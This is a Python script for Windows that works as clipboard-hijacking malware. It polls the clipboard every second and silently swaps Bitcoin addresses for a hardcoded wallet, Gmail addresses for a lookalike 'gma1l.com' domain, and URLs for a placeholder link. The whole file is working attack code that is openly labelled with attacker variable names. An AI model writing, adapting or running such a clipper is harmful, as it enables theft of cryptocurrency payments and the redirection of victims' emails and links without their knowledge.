import win32clipboard, re
from time import sleep

# /// script
# requires-python = ">=3.10"
# dependencies = ["pywin32"]
# ///

import win32clipboard
attacker_email = "attacker@evil.com"
email_regex = r'[a-zA-Z0-9._%+-]+@gmail.com'
btc_regex = r'bc1[a-zA-HJ-NP-Z0-9]{25,62}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}'
my_btc_wallet = "bc1qqt9srvg63vg69nn8xzcx4nqahlmgq2uevy799s"
#                bc1qqt9srvg63vg69nn8xzcx4nqahlmgq2uevpizda
               
url_regex = r"https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)"
my_url = r"https://asdasdasdasdasdas.adasdasdasd.com/welcome_page"


def update_data(data, type, regex):
    match = re.search(regex, data)
    if not match: return data
    val = match.group(0)
    match type:
        case "email":
                attacker_email = val.split("@")[0]+"@gma1l.com"
                data = data.replace(val, attacker_email)
        case "btc":
                data = data.replace(val, my_btc_wallet)
        case "url":
                data = data.replace(val, my_url)
    return data


while True:
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT).rstrip() 
    
    data = update_data(data, "email", email_regex)
    data = update_data(data, "btc", btc_regex)
    data = update_data(data, "url", url_regex)

    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardText(data, win32clipboard.CF_UNICODETEXT)
    win32clipboard.CloseClipboard()
    sleep(1)
# просто ? 